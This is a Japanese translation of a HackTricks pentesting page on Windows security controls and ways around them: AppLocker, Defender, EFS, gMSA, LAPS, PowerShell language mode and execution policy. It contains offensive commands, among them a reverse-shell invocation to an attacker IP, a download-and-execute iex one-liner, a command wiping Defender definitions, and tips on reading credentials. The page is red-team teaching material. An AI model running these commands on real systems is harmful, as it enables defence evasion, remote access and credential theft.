# Windowsセキュリティコントロール

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## AppLockerポリシー

アプリケーションホワイトリストは、システム上で存在し実行されることが許可されている承認済みのソフトウェアアプリケーションまたは実行可能ファイルのリストです。その目的は、特定のビジネスニーズに合わない有害なマルウェアや非承認のソフトウェアから環境を保護することです。

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker)は、Microsoftの**アプリケーションホワイトリストソリューション**であり、システム管理者に**ユーザーが実行できるアプリケーションとファイルを制御する機能**を提供します。実行可能ファイル、スクリプト、Windowsインストーラーファイル、DLL、パッケージ化されたアプリ、パックされたアプリインストーラーに対して**細かい制御**を提供します。\
組織が**cmd.exeとPowerShell.exeをブロック**し、特定のディレクトリへの書き込みアクセスを制限することは一般的ですが、これらはすべて回避できます。

### チェック

ブラックリスト/ホワイトリストに登録されているファイル/拡張子を確認します：
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
ホストに適用されたAppLockerのルールは、**`HKLM\Software\Policies\Microsoft\Windows\SrpV2`**の**ローカルレジストリから読み取る**こともできます。

### バイパス

* AppLockerポリシーをバイパスするための**書き込み可能なフォルダ**：AppLockerが`C:\Windows\System32`または`C:\Windows`内の何でも実行を許可している場合、**バイパスするために使用できる書き込み可能なフォルダ**があります。
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* 一般的に**信頼された**[**"LOLBAS's"**](https://lolbas-project.github.io/)のバイナリは、AppLockerをバイパスするのにも役立つ場合があります。
* **不適切に書かれたルールもバイパスできる**ことがあります。
* たとえば、**`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**という場合、**`allowed`**という名前のフォルダをどこにでも作成すると許可されます。
* 組織はしばしば**`%System32%\WindowsPowerShell\v1.0\powershell.exe`の実行可能ファイルをブロック**することに焦点を当てますが、**他の**[**PowerShell実行可能ファイルの場所**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations)、たとえば`%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`や`PowerShell_ISE.exe`を忘れがちです。
* **DLLの強制は非常に稀に有効化**されます。システムに負荷をかけることができ、何も壊れないことを確認するために必要なテストの量が多いためです。そのため、**DLLをバックドアとして使用するとAppLockerをバイパスするのに役立ちます**。
* [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)または[**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)を使用して、任意のプロセスでPowerShellコードを実行し、AppLockerをバイパスすることができます。詳細については、[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)を参照してください。

## 認証情報の保存

### Security Accounts Manager (SAM)

ローカルの認証情報は、このファイルに保存されており、パスワードはハッシュ化されています。

### Local Security Authority (LSA) - LSASS

**認証情報**（ハッシュ化されたもの）は、このサブシステムのメモリに保存されます。これはシングルサインオンのためです。\
LSAは、ローカルの**セキュリティポリシー**（パスワードポリシー、ユーザーの権限など）、**認証**、**アクセストークン**などを管理します。\
LSAは、ローカルログインの場合は**SAM**ファイル内の提供された認証情報をチェックし、ドメインユーザーの認証には**ドメインコントローラ**と通信します。

**認証情報**は、**LSASSプロセス**内に保存されます。これには、Kerberosチケット、NTおよびLMのハッシュ、簡単に復号できるパスワードが含まれます。

### LSAの秘密

LSAはディスクにいくつかの認証情報を保存することがあります：

* Active Directoryのコンピューターアカウントのパスワード（到達不能なドメインコントローラ）。
* Windowsサービスのアカウントのパスワード
* スケジュールされたタスクのパスワード
* その他（IISアプリケーションのパスワードなど）

### NTDS.dit

これはActive Directoryのデータベースです。ドメインコントローラにのみ存在します。

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender)は、Windows 10およびWindows 11、およびWindows Serverのバージョンで利用可能なアンチウイルスソフトウェアです。**`WinPEAS`**などの一般的なペンテストツールを**ブロック**します。ただし、これらの保護を**バイパスする方法**があります。

### チェック

**Defender**の**状態**を確認するには、PSコマンドレット**`Get-MpComputerStatus`**を実行します（**`RealTimeProtectionEnabled`**の値を確認してアクティブかどうかを確認します）：

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

列挙するには、次のコマンドも実行できます：
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## EFS（暗号化ファイルシステム）

EFSは、ファイルを**対称鍵**（ファイル暗号化鍵または**FEK**とも呼ばれる）で暗号化することによって機能します。その後、暗号化されたFEKは、ファイルを暗号化したユーザーに関連付けられた**公開鍵**で暗号化され、この暗号化されたFEKは暗号化されたファイルの$EFS **代替データストリーム**に格納されます。ファイルを復号化するには、EFSコンポーネントドライバーは、$EFSストリームに格納されている対称鍵を復号化するために、ファイルを暗号化したEFSデジタル証明書に一致する**秘密鍵**を使用します。[ここから](https://en.wikipedia.org/wiki/Encrypting\_File\_System)。

ユーザーが要求しなくても、次のような例でファイルが復号化されることがあります。

* ファイルとフォルダは、[FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table)などの別のファイルシステムでフォーマットされたボリュームにコピーされる前に復号化されます。
* 暗号化されたファイルは、SMB/CIFSプロトコルを使用してネットワーク経由でコピーされるため、ファイルはネットワークに送信される前に復号化されます。

この方法で暗号化されたファイルは、所有者ユーザー（暗号化したユーザー）によって**透過的にアクセス**できます。したがって、そのユーザーになることができれば、ファイルを復号化できます（ユーザーのパスワードを変更してログインしても機能しません）。

### EFS情報の確認

このパスが存在するかどうかを確認して、**ユーザー**がこの**サービス**を**使用**したかどうかを確認します：`C:\users\<username>\appdata\roaming\Microsoft\Protect`

`cipher /c \<file>\`を使用して、ファイルに**アクセス**できる**ユーザー**を確認します。
また、`cipher /e`と`cipher /d`をフォルダ内で使用して、すべてのファイルを**暗号化**および**復号化**することもできます。

### EFSファイルの復号化

#### Authority Systemであること

この方法では、**被害者ユーザー**がホスト内で**プロセス**を**実行**している必要があります。その場合、`meterpreter`セッションを使用して、ユーザーのプロセスのトークンをなりすますことができます（`incognito`の`impersonate_token`を使用）。または、ユーザーのプロセスに`migrate`することもできます。

#### ユーザーのパスワードを知っている場合

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## グループ管理サービスアカウント（gMSA）

ほとんどのインフラストラクチャでは、サービスアカウントは「**パスワードの有効期限なし**」オプションを持つ通常のユーザーアカウントです。これらのアカウントの管理は本当にめんどくさいことになることがあり、それがMicrosoftが**管理サービスアカウント**を導入した理由です：

* パスワードの管理が不要です。複雑でランダムな240文字のパスワードを使用し、ドメインまたはコンピュータのパスワードの有効期限が切れると自動的に変更されます。
* Microsoft Key Distribution Service（KDC）を使用してgMSAのパスワードを作成および管理します。
* ロックアウトされることはなく、対話型ログインには使用できません。
* 複数のホスト間で共有できます。
* スケジュールされたタスクを実行するために使用できます（管理サービスアカウントはスケジュールされたタスクの実行をサポートしていません）。
* 簡素化されたSPN管理 - コンピュータの**sAMaccount**の詳細やDNS名のプロパティが変更された場合、システムは自動的にSPN値を変更します。

gMSAアカウントのパスワードは、LDAPプロパティである_**msDS-ManagedPassword**_に格納されており、DCは30日ごとに自動的にリセットされ、**認証された管理者**およびインストールされている**サーバー**によって取得できます。_**msDS-ManagedPassword**_は、接続がセキュリティで保護されている場合（LDAPS）や認証タイプが「シーリング＆セキュア」の場合にのみ取得できる暗号化されたデータブロブであり、[MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)と呼ばれます。

![Image from https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

したがって、gMSAが使用されている場合は、**特権**を持っているかどうかを確認し、サービスのパスワードを**読み取る**権限があるかどうかも確認してください。

[**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)を使用してこのパスワードを読み取ることができます。
```
/GMSAPasswordReader --AccountName jkohler
```
また、この[ウェブページ](https://cube0x0.github.io/Relaying-for-gMSA/)をチェックして、**NTLMリレーアタック**を実行して**gMSA**の**パスワード**を**読み取る**方法について確認してください。

## LAPS

\*\*\*\*[**Local Administrator Password Solution (LAPS)**](https://www.microsoft.com/en-us/download/details.aspx?id=46899)は、ドメインに参加しているコンピュータの**ローカル管理者パスワード**（ランダム化され、一意で**定期的に変更される**）を管理することができます。これらのパスワードはActive Directoryに集中的に保存され、ACLを使用して認可されたユーザーに制限されます。ユーザーに十分な権限が与えられている場合、ローカル管理者のパスワードを読み取ることができるかもしれません。

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS Constrained Language Mode

PowerShell \*\*\*\* [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)は、PowerShellを効果的に使用するために必要な多くの機能を制限します。これには、COMオブジェクトのブロック、承認された.NETタイプのみの許可、XAMLベースのワークフロー、PowerShellクラスなどが含まれます。

### **チェック**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### バイパス
```powershell
#Easy bypass
Powershell -version 2
```
現在のWindowsでは、このバイパスは機能しませんが、[**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM)を使用することができます。\
**コンパイルするためには、** **参照を追加する必要があります** **->** _**参照の追加**_ -> _参照の参照_ -> _参照の参照_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` を追加し、**プロジェクトを .Net4.5 に変更してください**。

#### 直接バイパス：
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### リバースシェル:

A reverse shell is a type of shell in which the target machine initiates the connection to the attacker's machine. This allows the attacker to gain remote access to the target machine and execute commands. Reverse shells are commonly used in post-exploitation scenarios to maintain persistent access to a compromised system.

リバースシェルは、ターゲットマシンが攻撃者のマシンに接続を開始するタイプのシェルです。これにより、攻撃者はターゲットマシンにリモートアクセスしてコマンドを実行することができます。リバースシェルは、侵害されたシステムへの持続的なアクセスを維持するために、しばしばポストエクスプロイテーションのシナリオで使用されます。
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)または[**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)を使用して、制約モードをバイパスし、任意のプロセスで**PowerShellコードを実行**することができます。詳細については、[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)を参照してください。

## PS実行ポリシー

デフォルトでは**restricted**に設定されています。このポリシーをバイパスする主な方法は次のとおりです：
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
詳細は[こちら](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)で確認できます。

## Security Support Provider Interface (SSPI)

ユーザーの認証に使用されるAPIです。

SSPIは、通信を行いたい2つのマシンに適切なプロトコルを見つける役割を担います。これには、Kerberosが最も一般的に使用されます。その後、SSPIはどの認証プロトコルを使用するかを交渉し、これらの認証プロトコルはセキュリティサポートプロバイダ（SSP）と呼ばれ、各Windowsマシン内のDLLとして存在し、通信するためには両方のマシンで同じサポートが必要です。

### 主なSSP

* **Kerberos**: 最も一般的なもの
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1**および**NTLMv2**: 互換性のため
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: WebサーバーとLDAP、MD5ハッシュ形式のパスワード
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSLおよびTLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: 使用するプロトコルを交渉するために使用されます（デフォルトはKerberos）
* %windir%\Windows\System32\lsasrv.dll

#### 交渉には複数の方法または1つの方法のみが提供される場合があります。

## UAC - ユーザーアカウント制御

[ユーザーアカウント制御（UAC）](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)は、**昇格したアクティビティの承認プロンプト**を有効にする機能です。

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したいですか、またはHackTricksをPDFでダウンロードしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**を**フォロー**してください。**
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **および** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>
